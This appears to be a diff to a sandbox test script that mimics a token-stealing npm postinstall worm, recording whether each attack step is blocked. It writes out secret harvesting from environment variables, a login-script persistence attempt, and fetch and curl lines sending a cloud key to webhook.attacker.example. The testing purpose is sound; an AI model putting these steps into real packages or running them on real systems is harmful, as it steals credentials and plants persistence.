@@ -1,8 +1,11 @@
 // A harmless imitation of a token-stealing postinstall (the September 2025 Shai-Hulud worm). It tries each step the
 // worm tried and writes what happened to postinstall-report.json. It never sends anything anywhere real: every host is
 // a reserved .example name, and it does not publish packages or copy itself. Outcomes: blocked, nothing-there,
-// contained (worked, but only inside this task's own copy) or got-through (a failure of the defence).
+// read (it read something; the demo checks that it was only the box's decoy key), contained (worked, but only
+// inside this task's own copy) or got-through (a failure of the defence).
+const { spawnSync } = require('node:child_process');
 const fs = require('node:fs');
+const http = require('node:http');
 const net = require('node:net');
 const path = require('node:path');
 
@@ -17,7 +20,7 @@ async function main() {
   // 1. Secrets in the environment: the worm harvested tokens (GitHub, npm, cloud keys) from process.env.
   // Match real credential names (_TOKEN, _SECRET, _API_KEY, AWS_*), never npm's own npm_config_*/npm_package_* lifecycle vars.
   const named = Object.keys(process.env).filter((k) => /^AWS_|_TOKEN$|_SECRET$|_PASSWORD$|_API_KEY$/i.test(k));
-  add('env', 'read secrets from the environment', named.length ? 'got-through' : 'nothing-there', named.length ? named.join(',') : 'no token-like variable');
+  add('env', 'read secrets from the environment', named.length ? 'read' : 'nothing-there', named.length ? named.join(',') : 'no token-like variable');
 
   // 2. Dotfiles that hold credentials, in this user's home and in the machine's real users' homes.
   const home = process.env.HOME ?? '';
@@ -68,7 +71,30 @@ async function main() {
     add('persist-system', 'write a login script into /etc/profile.d', 'got-through', 'written');
   } catch (e) { add('persist-system', 'write a login script into /etc/profile.d', 'blocked', code(e)); }
 
-  fs.writeFileSync(path.join(proj, 'postinstall-report.json'), JSON.stringify(report, null, 1));
+  // 9. Send the cloud key from the environment out in a Node fetch, as a JavaScript stealer would. fetch asks the proxy
+  // for a CONNECT tunnel even for plain HTTP, and the box checks only the host name there, so the allowlist refuses
+  // it but the tripwire does not see the key in the URL.
+  const key = process.env.AWS_SECRET_ACCESS_KEY;
+  if (key) {
+    const sent = await ask('http://webhook.attacker.example/collect?k=' + key);
+    add('exfil-decoy-fetch', 'send the cloud key to the attacker with Node fetch', reached(sent) ? 'got-through' : 'blocked', sent);
+  }
+
+  // The report goes into the task's action log through the broker (the task's own socket) before the last step,
+  // because the last step gets the task stopped and undone, and the log is what survives an undo. Names only.
+  await step('postinstall report: ' + JSON.stringify(report));
+
+  // 10. The last step: send the same key with curl, which sends the whole URL to the proxy, the way a shell-script
+  // stealer would. The box put a decoy there (AWS_*), watches for it leaving, and stops and undoes the task.
+  if (key) spawnSync('curl', ['-s', '-m', '5', 'http://webhook.attacker.example/collect?k=' + key], { stdio: 'ignore' });
 }
 
-main().catch((e) => { add('postinstall', 'crashed', 'blocked', e.message); fs.writeFileSync(path.join(process.env.INIT_CWD ?? '.', 'postinstall-report.json'), JSON.stringify(report)); });
+// Post one step to the task's log over the broker socket; a failure only means there is no log to write to.
+const step = (text) => new Promise((resolve) => {
+  if (!process.env.BOX_SOCKET) return resolve();
+  const req = http.request({ socketPath: process.env.BOX_SOCKET, path: '/step', method: 'POST', headers: { 'content-type': 'application/json' } }, (res) => (res.resume(), res.on('end', resolve)));
+  req.on('error', resolve);
+  req.end(JSON.stringify({ text }));
+});
+
+main().catch((e) => step('postinstall crashed: ' + e.message));
